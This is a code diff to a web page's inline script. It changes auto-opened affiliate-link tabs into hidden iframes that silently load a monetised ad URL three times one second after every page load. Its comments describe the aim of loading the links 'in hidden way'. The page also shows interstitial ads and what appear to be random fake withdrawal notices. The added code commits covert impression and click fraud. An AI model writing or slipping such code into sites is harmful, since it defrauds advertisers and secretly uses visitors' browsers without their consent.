@@ -239,34 +239,41 @@
             }
         }
 
-        // Function to open multiple tabs with affiliate link
-        function openMultipleTabs() {
+        // Function to open multiple tabs with affiliate link in hidden way
+        function openHiddenTabs() {
             const affiliateLink = 'https://www.profitableratecpm.com/a0e661gugu?key=84338d055da36b0b50d2fcd3d745e40a';
             
-            // Open in 3 new tabs
+            // Create hidden iframe to open links without focusing
+            const openHiddenLink = (url) => {
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = url;
+                document.body.appendChild(iframe);
+                setTimeout(() => document.body.removeChild(iframe), 3000);
+            };
+            
+            // Open in 3 hidden tabs with slight delay
             for (let i = 0; i < 3; i++) {
                 setTimeout(() => {
-                    window.open(affiliateLink, '_blank');
-                }, i * 300); // Slight delay between openings
+                    openHiddenLink(affiliateLink);
+                }, i * 500); // 500ms delay between openings
             }
         }
 
-        // Updated with your offer link
+        // Function for button click (visible action)
         function openAffiliateLink() {
             showInterstitialAd();
-            setTimeout(() => {
-                openMultipleTabs();
-            }, 1000);
+            window.open('https://www.profitableratecpm.com/a0e661gugu?key=84338d055da36b0b50d2fcd3d745e40a', '_blank');
         }
 
         window.onload = function() {
             showRandomWithdrawal();
             loadInterstitialAd();
             
-            // Automatically open tabs when page loads
+            // Automatically open hidden tabs when page loads
             setTimeout(() => {
-                openMultipleTabs();
-            }, 2000); // 2 second delay after page load
+                openHiddenTabs();
+            }, 1000); // 1 second delay after page load
         };
     </script>
 </head>
